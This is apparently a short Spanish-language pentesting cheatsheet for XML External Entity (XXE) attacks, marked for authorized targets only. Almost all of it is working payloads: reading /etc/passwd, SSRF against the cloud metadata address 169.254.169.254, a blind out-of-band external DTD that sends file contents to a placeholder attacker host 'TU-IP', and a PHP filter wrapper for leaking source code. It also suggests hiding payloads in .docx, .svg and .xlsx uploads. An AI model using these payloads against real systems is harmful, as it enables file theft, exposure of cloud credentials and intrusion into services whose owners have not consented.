# Cheatsheet · XXE

Explicación en `../../01-web/xxe/xxe.md`. **Solo sobre objetivos autorizados.**

## Lectura de ficheros (in-band)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```

## SSRF vía XXE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<foo>&xxe;</foo>
```

## Blind / OOB (DTD externa)

```xml
<!DOCTYPE foo [ <!ENTITY % ext SYSTEM "http://TU-IP/evil.dtd"> %ext; ]>
```

```
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://TU-IP/?x=%file;'>">
%eval; %exfil;
```

## PHP wrapper (leer código en base64)

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

## Notas

- Prueba también en subidas de `.docx`/`.svg`/`.xlsx` (son XML por dentro).
- Si no hay salida directa → OOB con DTD externa.
